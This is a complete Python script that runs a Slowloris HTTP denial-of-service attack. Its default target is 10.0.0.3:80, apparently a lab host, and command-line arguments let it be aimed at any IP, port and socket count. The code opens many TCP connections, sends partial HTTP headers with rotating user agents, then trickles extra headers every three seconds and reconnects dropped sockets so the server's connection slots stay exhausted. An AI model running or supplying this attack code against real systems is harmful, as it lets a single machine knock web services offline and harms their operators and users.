#!/usr/bin/env python3
"""
Lightweight Slowloris HTTP Header Starvation DoS Script
======================================================
Opens multiple lingering TCP connections to the target HTTP server (10.0.0.3:80)
and trickles incomplete HTTP headers to hold server sockets open indefinitely.

Usage:
    python3 network/slowloris.py [target_ip] [target_port] [socket_count]
    (Default: 10.0.0.3 80 150)
"""

import sys
import socket
import random
import time

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.3"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SOCKET_COUNT = int(sys.argv[3]) if len(sys.argv) > 3 else 150

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]

def init_socket(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((ip, port))
        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

def main():
    print(f"[*] Initializing Slowloris attack against {TARGET_IP}:{TARGET_PORT} with {SOCKET_COUNT} sockets...")
    socket_list = []

    for i in range(SOCKET_COUNT):
        s = init_socket(TARGET_IP, TARGET_PORT)
        if s:
            socket_list.append(s)
        if (i + 1) % 25 == 0:
            print(f"[*] Created {len(socket_list)} active lingering connections...")

    print(f"[+] All {len(socket_list)} connections established. Trickling keep-alive headers...")

    try:
        while True:
            live_sockets = 0
            for s in list(socket_list):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    live_sockets += 1
                except socket.error:
                    socket_list.remove(s)
                    new_s = init_socket(TARGET_IP, TARGET_PORT)
                    if new_s:
                        socket_list.append(new_s)

            print(f"[*] Holding {live_sockets} sockets open against {TARGET_IP} (Slow DDoS in progress)...")
            time.sleep(3.0)
    except KeyboardInterrupt:
        print("\n[!] Stopping Slowloris attack and closing all sockets.")
        for s in socket_list:
            try:
                s.close()
            except Exception:
                pass

if __name__ == "__main__":
    main()
